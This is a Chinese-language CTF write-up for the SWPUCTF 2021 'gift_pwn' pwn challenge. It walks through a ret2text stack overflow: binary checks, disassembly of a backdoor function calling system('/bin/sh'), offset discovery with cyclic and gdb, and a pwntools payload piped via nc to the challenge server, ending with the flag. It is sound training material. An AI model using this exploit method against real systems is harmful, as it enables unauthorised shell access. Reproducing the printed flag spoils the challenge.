> Problem: [[SWPUCTF 2021 新生赛]gift_pwn](https://www.nssctf.cn/problem/390)

## 栈溢出 ret2text 栈

## 分析

```
file 附件 → ELF 64-bit, not stripped
strings 附件 → 发现"/bin/sh"和"Welcom new to NSS"
nm 附件 | grep " T " → 找到gift、vuln、main函数
checksec ./附件 → 无canary、无PIE、Partial RELRO → 简单栈溢出
```

## 关键函数

### gift函数（后门）

```
4005b6: mov $0x400694,%edi  # puts("Welcom new to NSS")
4005bf: call puts@plt
4005c4: mov $0x4006a6,%edi  # system("/bin/sh")
4005ce: call system@plt
```

### vuln函数（漏洞）

```
4005da: sub $0x10,%rsp      # 分配16字节缓冲区 char buffer[16]; 
4005e2: mov $0x64,%edx      # 读取100字节       read(0, buffer, 100);
4005ef: call read@plt       # 栈溢出！
```

## 利用

**偏移计算**：
**动态调试确定偏移量**
**步骤**

1. **生成测试字符串**

   ```bash
   python3 -c "from pwn import *; print(cyclic(200).decode())" > test.txt
   ```
2. **gdb运行程序**

   ```bash
   gdb ./附件 -ex "r < test.txt" -ex "x/8wx \$rsp" -ex "quit"
   ```
3. **获取崩溃信息**

   ```
   Program received signal SIGSEGV, Segmentation fault.
   0x00000000004005f6 in vuln ()
   0x7fffffffdd88: 0x61616167      0x61616168      0x61616169      0x6161616a
   ```
4. **计算偏移**

   ```bash
   python3 -c "from pwn import *; print('偏移:', cyclic_find(0x61616167))"
   ```

   **输出：偏移: 24**

**payload**：

```python
payload = b'A'*24 + p64(0x4005b6)  # 跳转到gift函数
```

## 攻击

```bash
python3 -c "
from pwn import *
payload = b'A'*24 + p64(0x4005b6)
sys.stdout.buffer.write(payload)
" | nc node4.anna.nssctf.cn 26056
```

## Flag

```
NSSCTF{f0f1eb27-437e-45f0-ab15-293ca48fc820}
```

**核心**：栈溢出 → 覆盖返回地址 → 跳转至后门函数getshell